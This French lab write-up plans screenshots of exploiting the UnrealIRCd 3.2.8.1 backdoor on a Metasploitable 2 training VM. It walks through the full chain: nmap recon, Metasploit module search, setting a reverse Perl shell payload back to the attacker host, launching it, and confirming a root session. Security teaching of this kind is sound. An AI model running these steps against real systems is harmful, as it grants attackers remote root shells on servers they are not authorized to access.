# Captures — UnrealIRCd 3.2.8.1 Backdoor (MS2, port 6667)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1`.
6 captures. Chaque capture montre **la commande tapée ET son résultat** (prompt visible).

> Rappel throttle : laisser ~15 s entre deux connexions au port 6667, sinon le serveur
> répond `Throttled: Reconnecting too fast`.

## 01-recon-nmap.png

Commande :
```bash
nmap -sC -sV -p 6667 192.168.56.101
```

Encadrer en rouge : la ligne `6667/tcp open irc UnrealIRCd` + la ligne
`Service Info: Host: irc.Metasploitable.LAN`.

## 02-recherche-module.png

Les deux recherches à la suite dans le même terminal (regroupées en une capture, comme
vsftpd) :
```bash
searchsploit unrealircd
msfconsole -q -x "search unrealircd; exit"
```

Encadrer en rouge : la ligne `UnrealIRCd 3.2.8.1 - Backdoor Command Execution` dans
`searchsploit`, et la ligne `0  exploit/unix/irc/unreal_ircd_3281_backdoor` dans le résultat
`search`.

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"
```

Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2010-2075` sous
`References`.

## 04-exploit-config.png

En interactif dans `msfconsole` (commande par commande, comme le ferait un humain au clavier
— pas le resource script) :
```
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set RPORT 6667
msf6 exploit(...) > set LHOST 192.168.56.1
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set payload cmd/unix/reverse_perl
```

Encadrer en rouge : aucun (la liste des `set` est déjà courte et lisible en entier).

## 05-exploit-launch.png

Commande (dans la même session interactive) :
```
msf6 exploit(...) > exploit -z
```

Encadrer en rouge : les deux lignes
`[+] ... The target appears to be vulnerable` et
`[*] Command shell session 1 opened ...`.

## 06-session-root.png

Commande (dans la même session interactive) :
```
msf6 exploit(...) > sessions -c 'id; uname -a; hostname' -i 1
```

Encadrer en rouge : la ligne `uid=0(root) gid=0(root)`.
